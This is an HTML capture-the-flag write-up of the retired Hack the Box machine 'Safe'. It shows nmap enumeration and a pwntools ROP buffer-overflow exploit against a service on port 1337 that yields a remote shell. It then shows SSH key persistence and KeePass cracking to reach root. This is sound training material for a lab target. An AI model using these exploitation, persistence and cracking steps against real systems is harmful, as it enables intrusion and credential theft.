I"D<h1 id="safe--hack-the-box-write-up"><a href="#header-1"></a>Safe – Hack the Box write-up</h1>

<p><strong>Safe</strong> is a <em>retired</em> machine from Hack the Box. It is rated as a easy machine, however, the user own difficulty is rated medium-hard (probably for containing a ROP exploitable binary, uncommon in this platform.</p>

<p><img src="https://raw.githubusercontent.com/Spy0x7/Spy0x7.github.io/master/assets/2020-03-19-Hackthebox_Safe/0.png" alt="" /></p>

<h2 id="enumeration"><a href="#header-2"></a>Enumeration</h2>

<p>First, let’s start running a quick scan to discover which ports are open.
<code class="language-plaintext highlighter-rouge">nmap -T5 -n -Pn -oG fastscan -p- 10.10.10.147</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 16:00 EDT                                                                                                                                 
Warning: 10.10.10.147 giving up on port because retransmission cap hit (2).                                                                                                                                     
Nmap scan report for 10.10.10.147                                                                                                                                                                               
Host is up (0.049s latency).                                                                                                                                                                                    
Not shown: 65532 closed ports                                                                                                                                                                                   
PORT     STATE SERVICE                                                                                                                                                                                          
22/tcp   open  ssh                                                                                                                                                                                              
80/tcp   open  http                                                                                                                                                                                             
1337/tcp open  waste                                                                                                                                                                                            
                                                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 113.76 seconds   
</code></pre></div></div>
<p>Now, let’s look more in depth what is the service associated with each port <code class="language-plaintext highlighter-rouge">nmap -T5 -n -p 22,80,1337 -sC -sV -oG indepthscan 10.10.10.147</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 17:17 EDT
Nmap scan report for 10.10.10.147
Host is up (0.052s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     17:30:31 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP:
|     17:30:26 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   GenericLines:
|     17:30:15 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   GetRequest:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     17:30:36 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? HELP
|   NULL:
|     17:30:15 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   RPCCheck:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|   RTSPRequest:
|     17:30:21 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq:
|     17:30:36 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   TLSSessionReq, TerminalServerCookie:
|     17:30:37 up 3:13, 0 users, load average: 0.00, 0.00, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=3/19%Time=5E73E16E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3E,"\x2017:30:15\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x
SF:20average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,63,"\x2017:3
SF:0:15\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2017:30:21\x20up\x20\x203:13,
SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.0
SF:0\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2017:30:21\x20up\x20\x203:13,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2017:30:21\x20up\x20\x203:1
SF:3,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2017:30:21\x20up\x20\x203:1
SF:3,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n")%r(DNSVersionBindReqTCP,3E,"\x2017:30:26\x20up\x20\x203:13,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")
SF:%r(DNSStatusRequestTCP,3E,"\x2017:30:31\x20up\x20\x203:13,\x20\x200\x20
SF:users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(Help,
SF:67,"\x2017:30:36\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20a
SF:verage:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me
SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2017:30:36
SF:\x20up\x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00
SF:,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
SF:20back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2017:30:37\x20up\
SF:x20\x203:13,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\
SF:.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\
SF:?\x20\x03\n")%r(TLSSessionReq,64,"\x2017:30:37\x20up\x20\x203:13,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nW
SF:hat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.54 seconds
</code></pre></div></div>

<p>Hmmm… Looks like we have a l33t port open. We’ll see what is running there later. 
By now, time to start my reconaissance part.</p>

<h2 id="recon"><a href="#header-2"></a>Recon</h2>

<p>First, let’s check if any of the running services can be exploited remotely.</p>

<p><img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/searchsploit.PNG" alt="" /></p>

<p>Nothing interesting so far. Better to see what is running under port 80.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/port80.PNG" alt="" /></p>

<p>Hurray, a boring <strong>Apache</strong> default page… Fuzzing does not give us any interesing information either.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG" alt="" /></p>

<p>However, reviewing the page source code gives us finally some valuable info! It seems that an app called ‘myapp’ (duh) is running under port 1337. 
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/fuzz.PNG" alt="" /></p>

<p>Also, we can download it by browsing into http://10.10.10.147/myapp. <code class="language-plaintext highlighter-rouge">curl -v -XGET http://10.10.10.147/myapp -o myapp</code> 
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/download_bin.PNG" alt="" /></p>

<p>It smells like a challenge similar to the BOF from the OSCP :). We need to confirm it sending a large message to the program. 
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/overflow.PNG" alt="" /></p>

<p>Yep, we go the buffer overflow. Let’s run <code class="language-plaintext highlighter-rouge">checksec</code> to see if it has any security measures enabled.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/checksec.PNG" alt="" /></p>

<p>Yikes, <strong>NX enabled</strong> (non-executable stack). We can not simply put our shellcode in the stack to jump and execute it.</p>

<p>After opening the binary with <strong>Ghidra</strong> and looking into the decompiled code, we can ensure that there exists the buffer overflow as only <strong>112 characters</strong> are reserved for the string.</p>

<p><img src="https://github.com/kikoas1995/kikoas1995.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/decompiledC.PNG" alt="" />
Also, the function system is called, which can allow us to execute remote code via ROP. Obviously, the argument passed to this function is not a shell. It is actually the <em>uptime</em> binary:
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/uptime_rdi.PNG" alt="" />
<img src="uptime exec" alt="" /></p>

<h2 id="exploitation"><a href="#header-2"></a>Exploitation</h2>

<p>It is time to use some binary exploitation skills. 
We need a way to put <code class="language-plaintext highlighter-rouge">/bin/sh</code> onto the <em>rdi</em> register and then call the local function <code class="language-plaintext highlighter-rouge">system()</code>.</p>
<blockquote>
  <p>Note: <em>rdi</em> register always acts as the first argument for the function that will be called. In x86 binaries, arguments were passed pushing registers into the stack.</p>
</blockquote>

<p>Using <code class="language-plaintext highlighter-rouge">objdump</code> we find a <code class="language-plaintext highlighter-rouge">system()</code> call in address 0x401040.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/system_addr.PNG" alt="" /></p>

<p>Now I will use <code class="language-plaintext highlighter-rouge">gef</code> to inspect the source code main and test functions.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/info_functions.PNG" alt="" />
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/disas main tests.PNG" alt="" /></p>

<p>Apparently, when the <code class="language-plaintext highlighter-rouge">test()</code> function ends, jumps to the memory address stored in the r13 register, so we need to put there the <code class="language-plaintext highlighter-rouge">system()</code> call we addressed before. In order to do this we need to look for a ROP gadget where we can store the system call. I will simplify this process using <strong>ropper</strong>:
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/ropper.PNG" alt="" /></p>

<p>Looks like <code class="language-plaintext highlighter-rouge">0x0000000000401206</code> would work for us.</p>

<p>We are almost finishing! We need to overwrite the stack base pointer with our shell, which will be done with the <em>pattern create</em> and <em>pattern offset</em> utilities of <code class="language-plaintext highlighter-rouge">gef</code>:</p>

<p><img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/pattern_create.PNG" alt="" />
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/pattern_offset.PNG" alt="" />
So the string <code class="language-plaintext highlighter-rouge">oaaaaaaa</code> will be in our case a <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>. Time to develope our own exploit with the help of <strong>pwntools</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'10.10.10.147'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> 
<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">112</span> <span class="o">+</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>   <span class="c1"># rbp = /bin/sh\x00
</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>            <span class="c1"># ROP gadget addr
</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span>            <span class="c1"># r13 = system() call addr 
</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000</span><span class="p">)</span>            <span class="c1"># r14 = blank
</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000</span><span class="p">)</span>            <span class="c1"># r15 = blank
</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>            <span class="c1"># init() addr
</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Safe(10.10.10.147) HTB machine remote exploit"</span><span class="p">)</span> 
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>It worked!!! :D
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/remoteshell.PNG" alt="" /></p>

<p>As the SSH service is enabled, I can add my public key to the authorized_keys file on the target:
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/ssh-keygen.PNG" alt="" />
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/sshshell.PNG" alt="" /></p>

<h2 id="privilege-escalation"><a href="#header-2"></a>Privilege Escalation</h2>

<p>Root is easier than user, you’ll see. First, Copy every file from the user folder.</p>

<p><img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/scp.PNG" alt="" /></p>

<p>Now let’s crack the keepass database. We have a list of images which can be a hint that the database key could be one of them. However, in addition to the file, it is protected with a password, so I will use a small wordlist for each image  used to decrypt de database.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/crack_keepass.PNG" alt="" /></p>

<p>It seems that the IMG_0547.JPG, along with the password ‘bullshit’, is our entrance to root :).
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/root_pwd.PNG" alt="" /></p>

<p>Performing a su root with the password retrieved leads us to our beloved root shell. Reading the flags from here is trivial.
<img src="https://github.com/Spy0x7/Spy0x7.github.io/blob/master/assets/2020-03-19-Hackthebox_Safe/flags.PNG" alt="" /></p>

:ET